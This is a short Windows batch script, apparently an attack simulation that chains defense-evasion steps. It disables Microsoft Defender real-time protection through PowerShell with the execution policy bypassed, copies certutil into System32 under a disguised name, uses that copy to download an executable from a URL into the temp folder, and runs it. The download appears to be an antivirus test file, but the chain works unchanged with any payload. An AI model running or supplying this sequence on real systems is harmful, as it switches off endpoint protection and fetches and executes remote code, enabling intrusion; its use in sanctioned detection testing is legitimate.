wmic process call create "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"Set-MpPreference -DisableRealtimeMonitoring 1\""
timeout /t 10 /nobreak >nul
copy C:\Windows\System32\certutil.exe C:\Windows\System32\KJNinja.exe
timeout /t 3 /nobreak >nul
KJNinja.exe -urlcache -f "https://aka.ms/ioavtest" "%Temp%\validatecloud.exe"
cmd /c "%Temp%\validatecloud.exe"
